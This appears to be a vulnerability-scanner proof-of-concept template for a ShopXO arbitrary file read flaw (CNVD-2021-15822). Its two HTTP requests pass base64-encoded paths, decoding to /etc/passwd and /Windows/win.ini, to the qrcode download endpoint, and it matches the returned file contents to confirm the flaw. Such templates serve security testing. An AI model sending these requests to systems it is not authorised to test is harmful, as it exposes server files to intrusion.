name: poc-yaml-shopxo-cnvd-2021-15822-fileread
manual: true
transport: http
rules:
    sx0:
        request:
            cache: true
            method: GET
            path: /public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q=
        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
    sx1:
        request:
            cache: true
            method: GET
            path: /public/index.php?s=/index/qrcode/download/url/L1dpbmRvd3Mvd2luLmluaQ==
        expression: response.status == 200 && "; for 16-bit app support".bmatches(response.body)
expression: sx0() || sx1()
detail:
    author: fengyang(https://github.com/bigDevi1)
    links:
        - https://github.com/MzzdToT/CNVD-2021-15822
        - http://cn-sec.com/archives/389653.html
    description: ShopXO download 任意文件读取漏洞
